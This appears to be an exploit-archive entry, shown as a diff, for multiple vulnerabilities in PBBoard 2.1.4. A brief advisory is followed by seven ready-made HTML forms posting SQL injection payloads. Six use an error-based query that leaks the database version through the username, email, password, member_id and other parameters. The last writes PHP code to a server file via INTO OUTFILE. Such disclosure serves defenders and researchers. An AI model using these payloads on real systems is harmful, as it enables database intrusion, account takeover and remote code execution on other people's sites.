@@ -1,0 +1,48 @@
+source: http://www.securityfocus.com/bid/54916/info
+
+PBBoard is prone to multiple security vulnerabilities including:
+
+1. Multiple SQL-injection vulnerabilities
+2. A security-bypass vulnerability
+3. An arbitrary file upload vulnerability
+
+Exploiting these issues could allow an attacker to carry out unauthorized actions on the underlying database, to gain access to various user accounts by changing account passwords, or to execute arbitrary script code on an affected computer in the context of the affected application.
+
+PBBoard 2.1.4 is vulnerable; other versions may also be affected.
+
+<form action="http://www.example.com/index.php?id=1&member=1&page=send&start=1" method="post" name="main" id="main">
+<input type="hidden" name="username" value="1' OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- ">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+<form action="http://www.example.com/index.php?page=forget&send_active_code=1" method="post" name="main" id="main">
+<input type="hidden" name="email" value="1' OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- ">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+<form action="http://www.example.com/index.php?page=forum_archive&password_check=1&id=1" method="post" name="main" id="main">
+<input type="hidden" name="password" value="1' OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- ">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+<form action="http://www.example.com/index.php?page=management&move=1&subject_id=1" method="post" name="main" id="main">
+<input type="hidden" name="section" value="1' OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- ">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+<form action="http://www.example.com/index.php?page=managementreply&startdeleteposts=1&do_replys=1" method="post" name="main" id="main">
+<input type="hidden" name="section_id" value="1' OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- ">
+<input type="hidden" name="check[]" value="1">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+<form action="http://www.example.com/index.php?page=new_password&forget=1" method="post" name="main" id="main">
+<input type="hidden" name="member_id" value="1' OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- ">
+<input type="hidden" name="new_password" value="1">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+<form action="http://www.example.com/index.php?page=tags&start=1" method="post" name="main" id="main">
+<input type="hidden" name="subjectid" value="' union select '<? php_code ?>',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33 INTO OUTFILE '../../../path/to/site/file.php' -- ">
+<input type="submit" name="Submit" value="Send">
+</form>
